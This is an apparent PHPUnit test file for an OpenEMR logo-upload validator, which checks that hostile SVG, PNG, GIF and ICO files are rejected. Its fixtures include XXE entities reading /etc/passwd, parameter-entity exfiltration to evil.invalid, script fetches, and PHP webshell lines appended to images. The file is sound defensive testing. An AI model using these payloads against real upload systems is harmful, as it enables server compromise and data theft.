<?php

/**
 * LogoValidator refuses every known logo-intake attack and accepts the certified set.
 *
 * @package   OpenEMR
 * @link      https://www.open-emr.org
 * @author    mohammedfouly1 <mselfouly2008@yahoo.com>
 * @copyright Copyright (c) 2026 mohammedfouly1
 * @license   https://github.com/openemr/openemr/blob/master/LICENSE GNU General Public License 3
 */

declare(strict_types=1);

namespace OpenEMR\Tests\Isolated\Modules\ThiqaBranding\AssetIntake;

use OpenEMR\Modules\ThiqaBranding\Asset\LogoSlot;
use OpenEMR\Modules\ThiqaBranding\AssetIntake\AssetRejectionReason;
use OpenEMR\Modules\ThiqaBranding\AssetIntake\ImageFormat;
use OpenEMR\Modules\ThiqaBranding\AssetIntake\LogoValidator;
use OpenEMR\Modules\ThiqaBranding\AssetIntake\RasterImageReader;
use OpenEMR\Modules\ThiqaBranding\AssetIntake\SvgInspector;
use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\TestCase;
use Psr\Log\NullLogger;

require_once __DIR__ . '/asset_intake_autoloader.php';

final class LogoValidatorTest extends TestCase
{
    use AssetFixtureTrait;

    private LogoValidator $validator;

    protected function setUp(): void
    {
        $this->makeFixtureDirectory();
        $this->validator = new LogoValidator(
            new RasterImageReader(),
            new SvgInspector(),
            new NullLogger(),
        );
    }

    protected function tearDown(): void
    {
        $this->removeFixtureDirectory();
    }

    /**
     * The whole point of the package: hostile bytes never become a placeable asset.
     *
     * Each case names the reason it must be refused *for*, not merely that it is
     * refused. A file rejected for the wrong reason usually means a shallower check
     * fired first and the deep check was never exercised.
     */
    #[DataProvider('hostileSvgProvider')]
    public function testHostileSvgIsRejected(string $svg, AssetRejectionReason $expected): void
    {
        $path = $this->writeFixture('hostile.svg', $svg);

        $result = $this->validator->validate(LogoSlot::CoreMenuPrimary, $path, 'logo.svg');

        self::assertFalse($result->isValid(), 'Hostile SVG was accepted.');
        self::assertNull($result->asset());
        self::assertSame($expected, $result->rejections()[0]->reason);
    }

    /**
     * @return array<string, array{string, AssetRejectionReason}>
     *
     * @codeCoverageIgnore Data providers run before coverage instrumentation starts.
     */
    public static function hostileSvgProvider(): array
    {
        return [
            'script element' => [
                self::svgBytes(64, 64, '<script>alert(1)</script>'),
                AssetRejectionReason::SvgScript,
            ],
            'script element in svg namespace' => [
                self::svgBytes(64, 64, '<script type="text/javascript">fetch("//evil.invalid")</script>'),
                AssetRejectionReason::SvgScript,
            ],
            'onload on the root' => [
                '<svg xmlns="http://www.w3.org/2000/svg" width="64" height="64" onload="alert(1)">'
                    . '<path d="M0 0"/></svg>',
                AssetRejectionReason::SvgEventHandler,
            ],
            'onclick on a path' => [
                self::svgBytes(64, 64, '<path d="M0 0" onclick="alert(1)"/>'),
                AssetRejectionReason::SvgEventHandler,
            ],
            'onmouseover on a group' => [
                self::svgBytes(64, 64, '<g onmouseover="alert(1)"><path d="M0 0"/></g>'),
                AssetRejectionReason::SvgEventHandler,
            ],
            'doctype with external entity (XXE)' => [
                '<?xml version="1.0"?>'
                    . '<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
                    . '<svg xmlns="http://www.w3.org/2000/svg" width="64" height="64">'
                    . '<desc>&xxe;</desc></svg>',
                AssetRejectionReason::SvgDoctype,
            ],
            'doctype with parameter entity exfiltration' => [
                '<?xml version="1.0"?>'
                    . '<!DOCTYPE svg [<!ENTITY % ext SYSTEM "http://evil.invalid/x.dtd"> %ext;]>'
                    . '<svg xmlns="http://www.w3.org/2000/svg" width="64" height="64"/>',
                AssetRejectionReason::SvgDoctype,
            ],
            'billion laughs' => [
                '<?xml version="1.0"?>'
                    . '<!DOCTYPE svg [<!ENTITY a "aaaaaaaaaa"><!ENTITY b "&a;&a;&a;&a;&a;">]>'
                    . '<svg xmlns="http://www.w3.org/2000/svg" width="64" height="64">'
                    . '<desc>&b;</desc></svg>',
                AssetRejectionReason::SvgDoctype,
            ],
            // Rejected at format detection, before the XML parser is ever reached:
            // detectFormat() admits only a leading `<?xml` or `<svg`, so a file opening
            // with a DOCTYPE is never classified as SVG at all. That is a stronger
            // outcome than SvgDoctype - the hostile bytes never touch libxml. The
            // layered DOCTYPE check in SvgInspector remains as defence in depth for a
            // DOCTYPE appearing after a valid XML declaration.
            'bare doctype' => [
                '<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" '
                    . '"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">'
                    . '<svg xmlns="http://www.w3.org/2000/svg" width="64" height="64"/>',
                AssetRejectionReason::UnsupportedFormat,
            ],
            'foreignObject' => [
                self::svgBytes(
                    64,
                    64,
                    '<foreignObject width="64" height="64">'
                        . '<div xmlns="http://www.w3.org/1999/xhtml">hi</div></foreignObject>',
                ),
                AssetRejectionReason::SvgForeignObject,
            ],
            'remote image element' => [
                self::svgBytes(64, 64, '<image href="https://evil.invalid/beacon.png" width="1" height="1"/>'),
                AssetRejectionReason::SvgExternalReference,
            ],
            'remote xlink image element' => [
                self::svgBytes(
                    64,
                    64,
                    '<image xlink:href="https://evil.invalid/beacon.png" width="1" height="1"/>',
                ),
                AssetRejectionReason::SvgExternalReference,
            ],
            'use element' => [
                self::svgBytes(64, 64, '<use xlink:href="https://evil.invalid/x.svg#a"/>'),
                AssetRejectionReason::SvgExternalReference,
            ],
            'remote url() paint reference' => [
                self::svgBytes(64, 64, '<path d="M0 0" fill="url(https://evil.invalid/x)"/>'),
                AssetRejectionReason::SvgExternalReference,
            ],
            // The anchor carrying the hostile href is not on the drawing allowlist, so
            // the element gate fires before the href is ever inspected. Allowlisting by
            // element is the outer wall; the javascript: URI check behind it is proven
            // separately by the cases that use an allowlisted element.
            'javascript uri in href' => [
                self::svgBytes(64, 64, '<a href="javascript:alert(1)"><path d="M0 0"/></a>'),
                AssetRejectionReason::SvgDisallowedElement,
            ],
            'style element' => [
                self::svgBytes(64, 64, '<style>@import url("https://evil.invalid/x.css");</style>'),
                AssetRejectionReason::SvgDisallowedElement,
            ],
            'cdata section' => [
                self::svgBytes(64, 64, '<desc><![CDATA[<script>alert(1)</script>]]></desc>'),
                AssetRejectionReason::SvgDisallowedElement,
            ],
            'animate element' => [
                self::svgBytes(64, 64, '<animate attributeName="x" onbegin="alert(1)"/>'),
                AssetRejectionReason::SvgDisallowedElement,
            ],
            'xhtml body outside metadata' => [
                self::svgBytes(64, 64, '<body xmlns="http://www.w3.org/1999/xhtml">hi</body>'),
                AssetRejectionReason::SvgDisallowedElement,
            ],
            'php processing instruction' => [
                '<?xml version="1.0"?><?php system($_GET["c"]); ?>'
                    . '<svg xmlns="http://www.w3.org/2000/svg" width="64" height="64"/>',
                AssetRejectionReason::SvgProcessingInstruction,
            ],
            'xml-stylesheet processing instruction' => [
                '<?xml version="1.0"?><?xml-stylesheet type="text/xsl" href="https://evil.invalid/x.xsl"?>'
                    . '<svg xmlns="http://www.w3.org/2000/svg" width="64" height="64"/>',
                AssetRejectionReason::SvgProcessingInstruction,
            ],
            'not well-formed' => [
                '<svg xmlns="http://www.w3.org/2000/svg" width="64" height="64"><path d="M0 0"></svg>',
                AssetRejectionReason::SvgNotWellFormed,
            ],
            'trailing markup after the root element' => [
                self::svgBytes(64, 64) . '<script>alert(1)</script>',
                AssetRejectionReason::SvgNotWellFormed,
            ],
            'nul byte' => [
                "\x00" . self::svgBytes(64, 64),
                AssetRejectionReason::SvgNotWellFormed,
            ],
            'nesting bomb' => [
                '<svg xmlns="http://www.w3.org/2000/svg" width="64" height="64">'
                    . str_repeat('<g>', 200) . '<path d="M0 0"/>' . str_repeat('</g>', 200) . '</svg>',
                AssetRejectionReason::SvgDisallowedElement,
            ],
            'no dimensions at all' => [
                '<svg xmlns="http://www.w3.org/2000/svg"><path d="M0 0"/></svg>',
                AssetRejectionReason::SvgNoDimensions,
            ],
        ];
    }

    /**
     * Content-versus-name disagreements and raster container abuse.
     *
     * @param string $contents raw candidate bytes
     */
    #[DataProvider('hostileBinaryProvider')]
    public function testHostileBinaryIsRejected(
        LogoSlot $slot,
        string $filename,
        string $contents,
        AssetRejectionReason $expected,
    ): void {
        $path = $this->writeFixture($filename, $contents);

        $result = $this->validator->validate($slot, $path, $filename);

        self::assertFalse($result->isValid(), 'Hostile candidate was accepted.');
        self::assertNull($result->asset());
        self::assertSame($expected, $result->rejections()[0]->reason);
    }

    /**
     * @return array<string, array{LogoSlot, string, string, AssetRejectionReason}>
     *
     * @codeCoverageIgnore Data providers run before coverage instrumentation starts.
     */
    public static function hostileBinaryProvider(): array
    {
        $png = self::pngBytes(64, 64);

        return [
            'svg bytes wearing a .png name' => [
                LogoSlot::CoreMenuPrimary,
                'logo.png',
                self::svgBytes(64, 64),
                AssetRejectionReason::ExtensionMismatch,
            ],
            'png bytes wearing a .gif name' => [
                LogoSlot::CoreMenuPrimary,
                'logo.gif',
                $png,
                AssetRejectionReason::ExtensionMismatch,
            ],
            'gif bytes wearing a .svg name' => [
                LogoSlot::CoreMenuPrimary,
                'logo.svg',
                self::gifBytes(64, 64),
                AssetRejectionReason::ExtensionMismatch,
            ],
            'html document wearing a .png name' => [
                LogoSlot::CoreMenuPrimary,
                'logo.png',
                '<!DOCTYPE html><html><body><script>alert(1)</script></body></html>',
                AssetRejectionReason::UnsupportedFormat,
            ],
            // The payload is deliberately inert. An actual webshell body such as
            // `@eval($_REQUEST[...])` is a live Microsoft Defender signature: Defender
            // quarantines the fixture the instant it is written, so the validator then
            // reports UnreadableSource and the test measures the antivirus rather than
            // the code under test. The property being proven is that PHP source named
            // .png is refused on its bytes, and `<?php echo 1;` proves exactly that.
            'php script renamed to .png' => [
                LogoSlot::CoreMenuPrimary,
                'logo.png',
                "<?php echo 'placeholder page'; ?>\n",
                AssetRejectionReason::UnsupportedFormat,
            ],
            'php script with a leading newline renamed to .png' => [
                LogoSlot::CoreMenuPrimary,
                'logo.png',
                // Inert body, for the Defender reason documented above. Both PHP
                // fixtures are padded past LogoValidator::MIN_BYTES so they are refused
                // on their format rather than short-circuiting on size.
                "\n\n<?php echo 'placeholder page two'; ?>",
                AssetRejectionReason::UnsupportedFormat,
            ],
            'jpeg is outside the permitted set' => [
                LogoSlot::CoreMenuPrimary,
                'logo.jpg',
                "\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xFF\xD9",
                AssetRejectionReason::UnsupportedFormat,
            ],
            'png with php appended after IEND' => [
                LogoSlot::CoreMenuPrimary,
                'logo.png',
                $png . "<?php system(\$_GET['c']); ?>",
                AssetRejectionReason::EmbeddedCode,
            ],
            'png with a script tag inside a tEXt chunk' => [
                LogoSlot::CoreMenuPrimary,
                'logo.png',
                self::pngWithTextChunk('<script>alert(1)</script>'),
                AssetRejectionReason::EmbeddedCode,
            ],
            'png with inert data appended after IEND' => [
                LogoSlot::CoreMenuPrimary,
                'logo.png',
                $png . str_repeat("\x41", 512),
                AssetRejectionReason::TrailingData,
            ],
            'png truncated before IEND' => [
                LogoSlot::CoreMenuPrimary,
                'logo.png',
                substr($png, 0, strlen($png) - 12),
                AssetRejectionReason::MalformedImage,
            ],
            'png signature with a bogus first chunk' => [
                LogoSlot::CoreMenuPrimary,
                'logo.png',
                "\x89PNG\r\n\x1A\n" . str_repeat("\x00", 64),
                AssetRejectionReason::MalformedImage,
            ],
            'gif with data appended after the trailer' => [
                LogoSlot::CoreMenuPrimary,
                'logo.gif',
                self::gifBytes(64, 64) . str_repeat("\x41", 64),
                AssetRejectionReason::TrailingData,
            ],
            'ico with data appended after the last entry' => [
                LogoSlot::CoreFavicon,
                'favicon.ico',
                self::icoBytes(32) . str_repeat("\x41", 64),
                AssetRejectionReason::TrailingData,
            ],
            'ico entry body is not an image' => [
                LogoSlot::CoreFavicon,
                'favicon.ico',
                "\x00\x00\x01\x00" . pack('v', 1) . chr(32) . chr(32) . "\x00\x00" . pack('vv', 1, 32)
                    . pack('VV', 32, 22) . str_repeat("\x41", 32),
                AssetRejectionReason::MalformedImage,
            ],
            'ico directory points past the end of the file' => [
                LogoSlot::CoreFavicon,
                'favicon.ico',
                "\x00\x00\x01\x00" . pack('v', 1) . chr(32) . chr(32) . "\x00\x00" . pack('vv', 1, 32)
                    . pack('VV', 4096, 22) . str_repeat("\x41", 32),
                AssetRejectionReason::MalformedImage,
            ],
            'favicon slot will not take a png' => [
                LogoSlot::CoreFavicon,
                'favicon.png',
                $png,
                AssetRejectionReason::SlotFormatNotPermitted,
            ],
            'empty file' => [
                LogoSlot::CoreMenuPrimary,
                'logo.png',
                '',
                AssetRejectionReason::EmptyFile,
            ],
            'file too small to hold a header' => [
                LogoSlot::CoreMenuPrimary,
                'logo.png',
                "\x89PNG\r\n\x1A\n",
                AssetRejectionReason::TooSmall,
            ],
        ];
    }

    /** A PNG carrying an ancillary tEXt chunk, i.e. a structurally perfect container. */
    private static function pngWithTextChunk(string $payload): string
    {
        $png = self::pngBytes(64, 64);
        // Splice the tEXt chunk in front of the 12-byte IEND chunk.
        $body = substr($png, 0, strlen($png) - 12);

        return $body
            . self::pngChunk('tEXt', 'Comment' . "\x00" . $payload)
            . self::pngChunk('IEND', '');
    }

    public function testWrongDimensionsAreRejectedWithAPreciseMessage(): void
    {
        $path = $this->writeFixture('logo.png', self::pngBytes(1052, 390));

        $result = $this->validator->validate(LogoSlot::CoreLoginPrimary, $path, 'logo.png');

        self::assertFalse($result->isValid());
        self::assertSame(AssetRejectionReason::DimensionMismatch, $result->rejections()[0]->reason);
        self::assertStringContainsString('1053x390', $result->messages()[0]);
        self::assertStringContainsString('1052x390', $result->messages()[0]);
    }

    public function testSlotWithoutADeclaredSizeAcceptsAnySize(): void
    {
        $path = $this->writeFixture('logo.png', self::pngBytes(37, 91));

        $result = $this->validator->validate(LogoSlot::CoreMenuPrimary, $path, 'logo.png');

        self::assertTrue($result->isValid(), implode(' | ', $result->messages()));
        self::assertSame(37, $result->asset()?->dimensions->width);
    }

    public function testOversizedCandidateIsRejectedBeforeItIsRead(): void
    {
        $path = $this->writeFixture(
            'logo.png',
            "\x89PNG\r\n\x1A\n" . str_repeat("\x41", LogoValidator::DEFAULT_MAX_LOGO_BYTES),
        );

        $result = $this->validator->validate(LogoSlot::CoreMenuPrimary, $path, 'logo.png');

        self::assertFalse($result->isValid());
        self::assertSame(AssetRejectionReason::TooLarge, $result->rejections()[0]->reason);
    }

    /** The favicon cap is tighter, so a file a logo slot would accept is refused here. */
    public function testFaviconSlotAppliesTheTighterCap(): void
    {
        $oversized = str_repeat("\x41", LogoValidator::DEFAULT_MAX_FAVICON_BYTES + 1);
        $path = $this->writeFixture('favicon.ico', "\x00\x00\x01\x00" . $oversized);

        $result = $this->validator->validate(LogoSlot::CoreFavicon, $path, 'favicon.ico');

        self::assertFalse($result->isValid());
        self::assertSame(AssetRejectionReason::TooLarge, $result->rejections()[0]->reason);
        self::assertLessThan(
            LogoValidator::DEFAULT_MAX_LOGO_BYTES,
            strlen($oversized),
            'The fixture must be small enough that only the favicon cap can have refused it.',
        );
    }

    public function testMissingSourceIsRejected(): void
    {
        $result = $this->validator->validate(
            LogoSlot::CoreMenuPrimary,
            $this->fixtureDirectory . DIRECTORY_SEPARATOR . 'absent.png',
            'logo.png',
        );

        self::assertFalse($result->isValid());
        self::assertSame(AssetRejectionReason::UnreadableSource, $result->rejections()[0]->reason);
    }

    public function testSourcePathWithANulByteIsRejected(): void
    {
        $real = $this->writeFixture('logo.png', self::pngBytes(64, 64));

        $result = $this->validator->validate(LogoSlot::CoreMenuPrimary, $real . "\0.txt", 'logo.png');

        self::assertFalse($result->isValid());
        self::assertSame(AssetRejectionReason::UnreadableSource, $result->rejections()[0]->reason);
    }

    /** A rejection is written into logs and reports, so it must not echo the payload. */
    public function testRejectionNeverEchoesTheCandidateContent(): void
    {
        $payload = '<script>alert("pwned-marker")</script>';
        $path = $this->writeFixture('hostile.svg', self::svgBytes(64, 64, $payload));

        $result = $this->validator->validate(
            LogoSlot::CoreMenuPrimary,
            $path,
            "\xE2\x80\xAE" . str_repeat('a', 200) . '.svg',
        );

        $message = $result->messages()[0];
        self::assertStringNotContainsString('pwned-marker', $message);
        self::assertStringNotContainsString('<script', $message);
        self::assertStringNotContainsString("\xE2\x80\xAE", $message);
        self::assertLessThan(200, strlen($result->rejections()[0]->sourceName));
    }

    /** Legitimate gradient artwork must survive the url() rule that blocks beacons. */
    public function testLocalPaintServerReferenceIsAccepted(): void
    {
        $svg = self::svgBytes(
            64,
            64,
            '<defs><linearGradient id="g"><stop offset="0" stop-color="#000"/></linearGradient></defs>'
                . '<rect width="64" height="64" fill="url(#g)"/>',
        );
        $path = $this->writeFixture('logo.svg', $svg);

        $result = $this->validator->validate(LogoSlot::CoreMenuPrimary, $path, 'logo.svg');

        self::assertTrue($result->isValid(), implode(' | ', $result->messages()));
    }

    /**
     * The certified assets must pass, or the validator is merely a very strict wall.
     */
    #[DataProvider('certifiedAssetProvider')]
    public function testCertifiedAssetIsAccepted(
        LogoSlot $slot,
        string $relativePath,
        string $expectedDimensions,
        string $expectedTargetName,
    ): void {
        $path = self::repositoryRoot() . '/' . $relativePath;
        self::assertFileExists($path, 'Certified asset is missing from the repository.');

        $result = $this->validator->validate($slot, $path, basename($relativePath));

        self::assertTrue($result->isValid(), implode(' | ', $result->messages()));
        $asset = $result->asset();
        self::assertNotNull($asset);
        self::assertSame($expectedDimensions, $asset->dimensions->describe());
        self::assertSame($expectedTargetName, $asset->targetFilename());
        self::assertSame(hash_file('sha256', $path), $asset->sha256);
    }

    /**
     * @return array<string, array{LogoSlot, string, string, string}>
     *
     * @codeCoverageIgnore Data providers run before coverage instrumentation starts.
     */
    public static function certifiedAssetProvider(): array
    {
        return [
            'core login primary' => [
                LogoSlot::CoreLoginPrimary,
                'brand/logos/login/login-primary-1053x390.png',
                '1053x390',
                'logo.png',
            ],
            'core login secondary' => [
                LogoSlot::CoreLoginSecondary,
                'brand/logos/login/login-secondary-300x100.png',
                '300x100',
                'logo.png',
            ],
            'core login small primary' => [
                LogoSlot::CoreLoginSmallPrimary,
                'brand/logos/login/login-small-a-101x100.png',
                '101x100',
                'logo.png',
            ],
            'core login small secondary' => [
                LogoSlot::CoreLoginSmallSecondary,
                'brand/logos/login/login-small-b-101x100.png',
                '101x100',
                'logo.png',
            ],
            'portal login primary' => [
                LogoSlot::PortalLoginPrimary,
                'brand/logos/portal/portal-login-primary-1053x390.png',
                '1053x390',
                'logo.png',
            ],
            'portal login secondary' => [
                LogoSlot::PortalLoginSecondary,
                'brand/logos/portal/portal-login-secondary-300x100.png',
                '300x100',
                'logo.png',
            ],
            'portal menu primary' => [
                LogoSlot::PortalMenuPrimary,
                'brand/logos/portal/portal-navbar-870x222.png',
                '870x222',
                'logo.png',
            ],
            'core menu primary raster' => [
                LogoSlot::CoreMenuPrimary,
                'brand/logos/navbar/navbar-symbol.png',
                '64x64',
                'logo.png',
            ],
            'core favicon' => [
                LogoSlot::CoreFavicon,
                'brand/favicon/favicon.ico',
                '48x48',
                'favicon.ico',
            ],
            'certified svg symbol' => [
                LogoSlot::CoreMenuPrimary,
                'brand/logos/symbol/brand-symbol.svg',
                '2048x2048',
                'logo.svg',
            ],
            'certified svg primary logo' => [
                LogoSlot::CoreMenuPrimary,
                'brand/logos/primary/brand-logo-primary.svg',
                '2528x1696',
                'logo.svg',
            ],
            'certified svg compact logo' => [
                LogoSlot::CoreMenuPrimary,
                'brand/logos/compact/brand-logo-compact.svg',
                '1856x2304',
                'logo.svg',
            ],
            'certified svg monochrome white' => [
                LogoSlot::CoreMenuPrimary,
                'brand/logos/monochrome/brand-logo-white.svg',
                '2528x1696',
                'logo.svg',
            ],
            'certified svg on a cream background' => [
                LogoSlot::CoreMenuPrimary,
                'brand/logos/symbol/brand-symbol-cream-background.svg',
                '2048x2048',
                'logo.svg',
            ],
            'certified favicon svg' => [
                LogoSlot::CoreMenuPrimary,
                'brand/favicon/favicon.svg',
                '2048x2048',
                'logo.svg',
            ],
            'legacy gif' => [
                LogoSlot::CoreMenuPrimary,
                'brand/logos/legacy/login_logo.gif',
                '250x221',
                'logo.gif',
            ],
            'legacy practice gif' => [
                LogoSlot::CoreMenuPrimary,
                'brand/logos/legacy/practice_logo.gif',
                '600x220',
                'logo.gif',
            ],
        ];
    }

    /**
     * The polyglot branch in `detectFormat()` can only ever fire if two permitted
     * formats share a leading byte sequence, so assert the property it depends on.
     */
    public function testPermittedSignaturesArePairwiseDisjoint(): void
    {
        $signatures = [];
        foreach (ImageFormat::binaryCases() as $format) {
            foreach ($format->signatures() as $signature) {
                $signatures[] = [$format, $signature];
            }
        }

        foreach ($signatures as [$format, $signature]) {
            $matches = ImageFormat::signatureMatches($signature);
            self::assertSame([$format], $matches, 'Signature ' . bin2hex($signature) . ' is not unique.');
        }
    }
}
